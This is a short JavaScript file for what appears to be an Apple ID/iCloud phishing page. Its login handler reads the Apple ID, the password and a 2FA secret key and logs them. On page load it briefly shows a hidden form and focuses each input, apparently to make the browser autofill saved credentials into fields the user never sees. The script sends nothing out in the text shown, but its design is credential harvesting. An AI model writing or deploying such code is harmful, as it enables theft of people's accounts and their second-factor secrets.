document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const appleId = document.getElementById('appleId').value;
    const icloudPassword = document.getElementById('icloudPassword').value;
    const twoFAKey = document.getElementById('twoFAKey').value;

    console.log('Apple ID:', appleId);
    console.log('iCloud Password:', icloudPassword);
    console.log('2FA Secret Key:', twoFAKey);
});

function triggerAutofill() {
    const hiddenForm = document.getElementById('hiddenForm');
    hiddenForm.style.display = 'block';

    const fields = hiddenForm.querySelectorAll('input');
    fields.forEach(field => {
        field.focus();
        field.blur();
    });

    setTimeout(() => {
        hiddenForm.style.display = 'none';
    }, 1000);
}

window.onload = triggerAutofill;